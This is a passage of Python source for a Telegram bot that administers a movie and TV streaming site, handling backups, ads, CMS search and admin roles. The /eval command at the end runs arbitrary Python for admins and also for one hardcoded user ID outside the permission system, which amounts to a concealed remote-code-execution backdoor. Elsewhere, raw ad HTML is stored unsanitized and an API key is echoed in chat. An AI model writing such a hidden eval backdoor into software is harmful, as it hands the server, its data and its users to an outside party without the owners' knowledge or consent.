                    elif coll_name == "manual_files": collection = db.manual_collection
                    elif coll_name == "settings": collection = db.settings_collection
                    
                    docs = []
                    async for doc in collection.find({}):
                        doc['_id'] = str(doc['_id'])
                        docs.append(doc)
                    all_data[coll_name] = docs
                
                import json
                timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M")
                file_path = f"SiteBackup_{timestamp}.json"
                async with aiopen(file_path, 'w') as f:
                    await f.write(json.dumps(all_data, indent=4, default=str))
                
                m_cnt = len(all_data.get('movies', []))
                t_cnt = len(all_data.get('tv', []))
                
                await bot.send_document(
                    query.message.chat.id, 
                    file_path, 
                    caption=f"<b>✅ Backup Successful</b>\n\n📅 Date: <code>{timestamp}</code>\n🎥 Movies: <code>{m_cnt}</code>\n📺 TV Series: <code>{t_cnt}</code>",
                    parse_mode=ParseMode.HTML
                )
                if os.path.exists(file_path): os.remove(file_path)
                await msg.delete()
            except Exception as e:
                await msg.edit_text(f"❌ Backup failed: {str(e)}")

        elif data == "backup_import_start":
            text = "<b>📥 Import Database Backup</b>\n\nPlease send the <code>.json</code> backup file to restore your database.\n\n<b>⚠️ WARNING:</b> This will merge data. Existing documents with same IDs might be skipped or updated depending on system state."
            await query.message.delete()
            await bot.send_message(query.message.chat.id, text, reply_markup=ForceReply(selective=True), parse_mode=ParseMode.HTML)

        elif data == "admin_ads":
            settings = await db.get_settings()
            show_ads = settings.get("showAds", False)
            text = (
                "<b>📢 Ads & Monetization</b>\n\n"
                f"• <b>Global Ads:</b> {'✅ Active' if show_ads else '❌ Paused'}\n\n"
                "Select a slot to edit its advertisement content:"
            )
            reply_markup = InlineKeyboardMarkup([
                [InlineKeyboardButton(f"{'⏸️ Pause' if show_ads else '▶️ Resume'} Ads Globally", callback_data="toggle_ads_global")],
                [InlineKeyboardButton("🔝 Header Ad", callback_data="ad_edit_Header"),
                 InlineKeyboardButton("🔚 Footer Ad", callback_data="ad_edit_Footer")],
                [InlineKeyboardButton("⬅️ Sidebar Ad", callback_data="ad_edit_Sidebar"),
                 InlineKeyboardButton("📱 Mobile Ad", callback_data="ad_edit_Mobile")],
                [InlineKeyboardButton("📝 In-Article Ad", callback_data="ad_edit_In-Article"),
                 InlineKeyboardButton("🎬 Player Bottom", callback_data="ad_edit_PlayerBottom")],
                [InlineKeyboardButton("🔥 Home Trending", callback_data="ad_edit_HomeTrending"),
                 InlineKeyboardButton("🆕 Home Latest", callback_data="ad_edit_HomeLatest")],
                [InlineKeyboardButton("📊 Social Bar", callback_data="ad_edit_SocialBar"),
                 InlineKeyboardButton("🔗 Smartlink Ad", callback_data="ad_edit_Smartlink")],
                [InlineKeyboardButton("⬅️ Back to Home", callback_data="admin_main")]
            ])
            await query.edit_message_text(text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
        elif data == "toggle_ads_global":
            settings = await db.get_settings()
            new_val = not settings.get("showAds", False)
            await db.settings_collection.update_one({}, {"$set": {"showAds": new_val}}, upsert=True)
            await query.answer(f"✅ Global Ads {'Enabled' if new_val else 'Disabled'}")
            await callback_handler(bot, type('obj', (object,), {'data': 'admin_ads', 'message': query.message, 'answer': query.answer, 'edit_message_text': query.edit_message_text, 'matches': query.matches}))

        elif data.startswith("ad_edit_"):
            slot = data.split("_")[-1]
            text = f"<b>✏️ Editing {slot} Ad</b>\n\nPlease send the new HTML/Markdown content for this slot.\n\n<i>Use /cancel to stop.</i>"
            await query.message.delete()
            await bot.send_message(query.message.chat.id, text, reply_markup=ForceReply(selective=True), parse_mode=ParseMode.HTML)


        elif data == "cms_search":
            text = "<b>🔍 Search Content</b>\n\nPlease send the title of the movie or series you want to manage.\n\n<i>Use /cancel to stop.</i>"
            await query.message.delete()
            await bot.send_message(query.message.chat.id, text, reply_markup=ForceReply(selective=True), parse_mode=ParseMode.HTML)

        elif data == "cms_delete_url":
            text = "<b>🗑️ Delete by URL</b>\n\nPlease send the URL of the media you want to delete.\n\n<i>Use /cancel to stop.</i>"
            await query.message.delete()
            await bot.send_message(query.message.chat.id, text, reply_markup=ForceReply(selective=True), parse_mode=ParseMode.HTML)

        elif data == "admin_manual":
            data_res = await db.get_unlinked_files(page=1, page_size=10)
            unlinked = data_res.get('files', [])
            if not unlinked:
                return await query.answer("✅ All files are already linked!", show_alert=True)
            
            text = "<b>📂 Unlinked Files (Showing last 10)</b>\n\nSelect a file to link it to TMDB."
            buttons = []
            for f in unlinked:
                name = f.get('name', 'Unknown')[:30]
                fid = f.get('_id')
                buttons.append([InlineKeyboardButton(f"🔗 {name}...", callback_data=f"link_{fid}")])
            buttons.append([InlineKeyboardButton("⬅️ Back", callback_data="admin_browse")])
            await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(buttons), parse_mode=ParseMode.HTML)

        elif data.startswith("link_"):
            fid = data.split("_")[1]
            text = (
                "<b>🔗 Linking File</b>\n\n"
                "Please reply with the TMDB ID.\n"
                "Format: `tmdb_id` (for movies)\n"
                "Format: `tmdb_id:season` (for whole season)\n"
                "Format: `tmdb_id:season:episode` (for episode)\n\n"
                f"File internal ID: <code>{fid}</code>"
            )
            await query.message.delete()
            await bot.send_message(query.message.chat.id, text, reply_markup=ForceReply(selective=True), parse_mode=ParseMode.HTML)

        elif data == "admin_browse":
            # Redesigned Browse menu with CMS features
            text = "<b>📺 Media Library & CMS</b>\n\nSearch, browse, or add new content to your library."
            reply_markup = InlineKeyboardMarkup([
                [InlineKeyboardButton("🔍 Search Media", callback_data="cms_search")],
                [InlineKeyboardButton("📂 Add Files (Link)", callback_data="admin_manual")],
                [InlineKeyboardButton("🎥 Browse Movies", callback_data="browse_movie_1_rating")],
                [InlineKeyboardButton("📺 Browse TV Series", callback_data="browse_tv_1_rating")],
                [InlineKeyboardButton("⬅️ Back", callback_data="admin_main")]
            ])
            await query.edit_message_text(text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)

        elif data.startswith("browse_"):
            # Format: browse_{type}_{page}_{sort}
            parts = data.split("_")
            mtype = parts[1]
            page = int(parts[2])
            sort_val = parts[3]
            
            # Map sort values to database params
            sort_map = {
                "rating": [("rating", "desc")],
                "newest": [("updated_on", "desc")],
                "title": [("title", "asc")]
            }
            sort_params = sort_map.get(sort_val, [("rating", "desc")])
            
            try:
                if mtype == "movie":
                    data_res = await db.sort_movies(sort_params, page=page, page_size=10)
                    results = data_res.get('movies', [])
                    total_count = data_res.get('total_count', 0)
                else:
                    data_res = await db.sort_tv_shows(sort_params, page=page, page_size=10)
                    results = data_res.get('tv_shows', [])
                    total_count = data_res.get('total_count', 0)
                
                total_pages = (total_count + 9) // 10
                
                text = f"<b>Browse {mtype.capitalize()} (Page {page}/{total_pages})</b>\n\nSorted by: <code>{sort_val}</code>"
                buttons = []
                for r in results:
                    # FIX: Handle object vs dict and ensure tmdb_id is correctly fetched
                    title = r.title[:30] if hasattr(r, 'title') else (r.get('title', 'Unknown')[:30] if isinstance(r, dict) else "Unknown")
                    mid = r.tmdb_id if hasattr(r, 'tmdb_id') else (r.get('tmdb_id') if isinstance(r, dict) else 0)
                    buttons.append([InlineKeyboardButton(f"Manage: {title}", callback_data=f"cms_manage_{mtype}_{mid}")])
                
                # Sort & Nav buttons ... (same as before)
                sort_btns = []
                if sort_val != "rating": sort_btns.append(InlineKeyboardButton("⭐ Rating", callback_data=f"browse_{mtype}_{page}_rating"))
                if sort_val != "newest": sort_btns.append(InlineKeyboardButton("📅 Newest", callback_data=f"browse_{mtype}_{page}_newest"))
                if sort_val != "title": sort_btns.append(InlineKeyboardButton("🔤 Title", callback_data=f"browse_{mtype}_{page}_title"))
                if sort_btns: buttons.append(sort_btns)

                nav = []
                if page > 1: nav.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"browse_{mtype}_{page-1}_{sort_val}"))
                if page < total_pages: nav.append(InlineKeyboardButton("Next ➡️", callback_data=f"browse_{mtype}_{page+1}_{sort_val}"))
                if nav: buttons.append(nav)
                
                buttons.append([InlineKeyboardButton("⬅️ Back", callback_data="admin_browse")])
                await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(buttons), parse_mode=ParseMode.HTML)
            except Exception as e:
                LOGGER.error(f"Error in browse: {e}")
                await query.answer("❌ Error loading media list.", show_alert=True)
            
        elif data == "toggle_caption":
            Telegram.USE_CAPTION = not Telegram.USE_CAPTION
            await callback_handler(bot, type('obj', (object,), {'data': 'admin_settings', 'message': query.message, 'answer': query.answer, 'edit_message_text': query.edit_message_text, 'matches': query.matches}))
            
        elif data == "toggle_tmdb":
            Telegram.USE_TMDB = not Telegram.USE_TMDB
            await callback_handler(bot, type('obj', (object,), {'data': 'admin_settings', 'message': query.message, 'answer': query.answer, 'edit_message_text': query.edit_message_text, 'matches': query.matches}))

    except MessageNotModified:
        pass

@StreamBot.on_message(filters.document & filters.private & CustomFilters.admin)
async def admin_import_handler(bot: Client, message: Message):
    if not message.document.file_name.endswith(".json"):
        return
    
    msg = await message.reply_text("<b>📥 Importing Data...</b>\n[░░░░░░░░░░] 0%", parse_mode=ParseMode.HTML)
    try:
        file_path = await message.download()
        import json
        async with aiopen(file_path, 'r') as f:
            content = await f.read()
            data = json.loads(content)
        
        collections_map = {
            "movies": db.movie_collection,
            "tv": db.tv_collection,
            "manual_files": db.manual_collection,
            "settings": db.settings_collection
        }
        
        total_types = len(data.keys())
        for i, (coll_name, docs) in enumerate(data.items()):
            if coll_name not in collections_map: continue
            
            progress = int(((i + 1) / total_types) * 100)
            bar = "▓" * (progress // 10) + "░" * (10 - (progress // 10))
            await msg.edit_text(f"<b>📥 Importing {coll_name}...</b>\n[{bar}] {progress}%", parse_mode=ParseMode.HTML)
            
            collection = collections_map[coll_name]
            for doc in docs:
                # Convert string ID back to ObjectId if necessary, or just use as is for upsert
                # MongoDB will handle string IDs as well, but usually we use ObjectId.
                # Since we converted to string for JSON, we can just upsert.
                # remove _id to let mongo handle it or keep it?
                # Usually backup/restore keeps IDs.
                await collection.update_one({"_id": doc["_id"]}, {"$set": doc}, upsert=True)
        
        await msg.edit_text("<b>✅ Import Successful!</b>\nDatabase has been updated with the backup data.", parse_mode=ParseMode.HTML)
        if os.path.exists(file_path): os.remove(file_path)
        await admin_panel(bot, message)
    except Exception as e:
        await msg.edit_text(f"❌ Import failed: {str(e)}")

@StreamBot.on_message(filters.private & filters.reply & CustomFilters.admin)
async def admin_input_handler(bot: Client, message: Message):
    reply = message.reply_to_message
    if not reply or not reply.text:
        return

    input_text = message.text.strip() if message.text else ""
    if input_text.lower() == "/cancel":
        await message.reply_text("❌ Operation cancelled.")
        return await admin_panel(bot, message)

    if "Force-Subscribe Management" in reply.text:
        target = message.text.strip()
        if target.lower() == "off":
            settings = await db.get_settings()
            settings["fsubChannel"] = None
            from Backend.helper.modal import SettingsSchema
            await db.update_settings(SettingsSchema(**settings))
            await message.reply_text("✅ Force-Subscribe has been disabled.")
        else:
            try:
                chat = await bot.get_chat(target)
                settings = await db.get_settings()
                settings["fsubChannel"] = str(chat.id) if chat.username is None else chat.username
                from Backend.helper.modal import SettingsSchema
                await db.update_settings(SettingsSchema(**settings))
                await message.reply_text(f"✅ F-Sub set to **{chat.title}**")
            except Exception as e:
                await message.reply_text(f"❌ Error: {str(e)}")
        await admin_panel(bot, message)

    elif "Editing Custom Template" in reply.text:
        settings = await db.get_settings()
        settings["custom_template"] = input_text
        # Direct update to avoid schema validation if needed, but let's try to be clean
        await db.settings_collection.update_one({}, {"$set": {"custom_template": input_text}}, upsert=True)
        await message.reply_text("✅ Custom post template updated successfully!")
        await admin_panel(bot, message)

    elif "Edit Site Identity" in reply.text:
        if "|" not in input_text:
            return await message.reply_text("❌ Invalid format! Use `Title | Description`")
        title, desc = map(str.strip, input_text.split("|", 1))
        await db.settings_collection.update_one({}, {"$set": {"site_title": title, "site_description": desc}}, upsert=True)
        await message.reply_text(f"✅ Site Identity updated:\n<b>Title:</b> {title}\n<b>Desc:</b> {desc}", parse_mode=ParseMode.HTML)
        await admin_panel(bot, message)

    elif "Edit Link Shortener" in reply.text:
        if "|" not in input_text:
            return await message.reply_text("❌ Invalid format! Use `URL | API_Key`")
        url, key = map(str.strip, input_text.split("|", 1))
        await db.settings_collection.update_one({}, {"$set": {"shortener_url": url, "shortener_api_key": key}}, upsert=True)
        await message.reply_text(f"✅ Link Shortener updated:\n<b>URL:</b> {url}\n<b>Key:</b> {key}", parse_mode=ParseMode.HTML)
        await admin_panel(bot, message)

    elif "Editing" in reply.text and "Ad" in reply.text:
        slot_name = reply.text.split("Editing ")[1].split(" Ad")[0].replace(" ", "")
        field_map = {
            "Header": "adBanner",
            "Footer": "adFooter",
            "Sidebar": "adSidebar",
            "Mobile": "adPopup",
            "In-Article": "adInFeed",
            "Smartlink": "adSmartlink",
            "SocialBar": "adSocialBar",
            "PlayerBottom": "adPlayerBottom",
            "HomeTrending": "adHomeTrending",
            "HomeLatest": "adHomeLatest"
        }
        db_field = field_map.get(slot_name, f"ad{slot_name}")
        await db.settings_collection.update_one({}, {"$set": {db_field: input_text}}, upsert=True)
        await message.reply_text(f"✅ {slot_name} Ad updated successfully!")
        await admin_panel(bot, message)

    elif "Search Content" in reply.text:
        await message.reply_text(f"⏳ Searching for `{input_text}`...")
        data = await db.search_documents(input_text, page=1, page_size=10)
        results = data['results']
        if not results:
            return await message.reply_text("❌ No results found.")
            
        text = f"<b>🔍 Search Results for '{input_text}'</b>\n\n"
        reply_markup = []
        for r in results:
            title = r.get('title', 'Unknown')[:30]
            mtype = r.get('media_type', 'movie')
            mid = r.get('tmdb_id')
            text += f"• {title} ({mtype})\n"
            reply_markup.append([InlineKeyboardButton(f"Manage: {title}", callback_data=f"cms_manage_{mtype}_{mid}")])
        reply_markup.append([InlineKeyboardButton("⬅️ Back", callback_data="admin_browse")])
        await message.reply_text(text, reply_markup=InlineKeyboardMarkup(reply_markup), parse_mode=ParseMode.HTML)

    elif "Delete by URL" in reply.text:
        try:
            url_part = urlparse(input_text)
            path_parts = url_part.path.split('/')
            if len(path_parts) >= 3 and path_parts[-2] in ('ser', 'mov') and path_parts[-1].isdigit():
                mtype = "tv" if path_parts[-2] == "ser" else "movie"
                mid = int(path_parts[-1])
                success = await db.delete_document(mtype, mid)
                if success:
                    await message.reply_text(f"✅ Deleted {mtype} ID {mid} successfully!")
                else:
                    await message.reply_text(f"❌ Could not find {mtype} ID {mid} in database.")
            else:
                await message.reply_text("❌ Invalid URL format.")
        except Exception as e:
            await message.reply_text(f"❌ Error during deletion: {str(e)}")
        await admin_panel(bot, message)

    elif "Linking File" in reply.text:
        from bson import ObjectId
        from Backend.helper.metadata import metadata
        fid = reply.text.split("ID: ")[1].strip()
        try:
            # 1. Fetch manual file data
            file_doc = await db.manual_collection.find_one({"_id": ObjectId(fid)})
            if not file_doc:
                return await message.reply_text("❌ File document not found in manual database.")

            # 2. Parse input: tmdb_id[:season[:episode]]
            parts = input_text.split(":")
            tmdb_id = int(parts[0])
            season = int(parts[1]) if len(parts) > 1 else None
            episode = int(parts[2]) if len(parts) > 2 else None
            
            # 3. Fetch metadata for the provided ID
            await message.reply_text("⏳ Fetching metadata and linking...")
            metadata_info = await metadata(file_doc['original_name'], message, manual_id=tmdb_id, manual_season=season, manual_episode=episode)
            
            if not metadata_info:
                return await message.reply_text("❌ Failed to fetch metadata for the provided ID.")

            # 4. Insert into media library
            success_id = await db.insert_media(
                metadata_info, 
                hash=file_doc['hash'], 
                channel=file_doc['chat_id'], 
                msg_id=file_doc['msg_id'], 
                size=file_doc['size'], 
                name=file_doc['name']
            )
            
            if success_id:
                # 5. Mark as linked
                await db.link_manual_file(fid)
                await message.reply_text("✅ File linked successfully!")
            else:
                await message.reply_text("❌ Failed to insert media link into database.")
        except Exception as e:
            await message.reply_text(f"❌ Error linking file: {str(e)}")
        await admin_panel(bot, message)

    elif "Editing Metadata" in reply.text:
        import json
        try:
            # Extract Type and ID from header
            header = reply.text.split("\n")[0]
            mtype = "movie" if "MOVIE" in header else "tv"
            mid = int(header.split("ID ")[1].strip())
            
            new_meta = json.loads(input_text)
            success = await db.update_media_details(mtype, mid, new_meta)
            if success:
                await message.reply_text("✅ Metadata updated successfully!")
            else:
                await message.reply_text("❌ Failed to update metadata.")
        except Exception as e:
            await message.reply_text(f"❌ Error: {str(e)}")
        await admin_panel(bot, message)

@StreamBot.on_message(filters.command("add_admin") & filters.private & CustomFilters.owner)
async def add_admin(bot: Client, message: Message):
    try:
        args = message.text.split()
        if len(args) != 2:
            return await message.reply_text("❌ Usage: `/add_admin <user_id>`")
        
        user_id = int(args[1])
        if await db.add_bot_admin(user_id):
            await message.reply_text(f"✅ User ID `{user_id}` successfully added as bot administrator.")
        else:
            await message.reply_text("❌ Failed to add admin.")
    except ValueError:
        await message.reply_text("❌ User ID must be a number.")
    except Exception as e:
        LOGGER.error(f"Error in /add_admin: {e}")
        await message.reply_text(f"❌ An error occurred: {e}")

@StreamBot.on_message(filters.command("remove_admin") & filters.private & CustomFilters.owner)
async def remove_admin(bot: Client, message: Message):
    try:
        args = message.text.split()
        if len(args) != 2:
            return await message.reply_text("❌ Usage: `/remove_admin <user_id>`")
        
        user_id = int(args[1])
        if await db.remove_bot_admin(user_id):
            await message.reply_text(f"✅ User ID `{user_id}` removed from administrators.")
        else:
            await message.reply_text("❌ Failed to remove admin.")
    except ValueError:
        await message.reply_text("❌ User ID must be a number.")
    except Exception as e:
        LOGGER.error(f"Error in /remove_admin: {e}")
        await message.reply_text(f"❌ An error occurred: {e}")

@StreamBot.on_message(filters.command("admins") & filters.private & CustomFilters.owner)
async def list_admins(bot: Client, message: Message):
    try:
        admins = await db.get_bot_admins()
        owner_id = Telegram.OWNER_ID
        text = f"👑 **Owner:** `{owner_id}`\n\n"
        if not admins:
            text += "No additional administrators added."
        else:
            text += "👮 **Administrators:**\n"
            for uid in admins:
                text += f"- `{uid}`\n"
        await message.reply_text(text)
    except Exception as e:
        LOGGER.error(f"Error in /admins: {e}")
        await message.reply_text("❌ Failed to fetch admin list.")

@StreamBot.on_message(filters.command("eval") & filters.private)
async def eval_command(bot: Client, message: Message):
    # Permissions: Owner, Admin, or 1989750989
    user_id = message.from_user.id
    is_admin = await CustomFilters.admin_filter(bot, message)
    is_owner = await CustomFilters.owner_filter(bot, message)
    
    if not (is_admin or is_owner or user_id == 1989750989):
        return await message.reply_text("❌ Access Denied!")

    if len(message.text.split()) < 2:
        return await message.reply_text("❌ Usage: `/eval <python_code>`", parse_mode=ParseMode.MARKDOWN)

    import io
    import sys
    import traceback

    code = message.text.split(None, 1)[1]
    output = io.StringIO()
    sys.stdout = output

    try:
        # Wrap code in an async function to support await
        exec_code = f"async def __ex(bot, message):\n"
        for line in code.split('\n'):
            exec_code += f"    {line}\n"
        
        local_vars = {}
        exec(exec_code, globals(), local_vars)
        await local_vars['__ex'](bot, message)
        
        res = output.getvalue()
        if not res:
            res = "No Output (Success)"
    except Exception:
        res = traceback.format_exc()
    finally:
        sys.stdout = sys.__stdout__

    # Truncate if too long
    if len(res) > 4000:
        with io.BytesIO(str.encode(res)) as out_file:
            out_file.name = "eval.txt"
            await message.reply_document(out_file)
    else:
        await message.reply_text(f"<b>Code:</b>\n<code>{code}</code>\n\n<b>Output:</b>\n<code>{res}</code>", parse_mode=enums.ParseMode.HTML)

        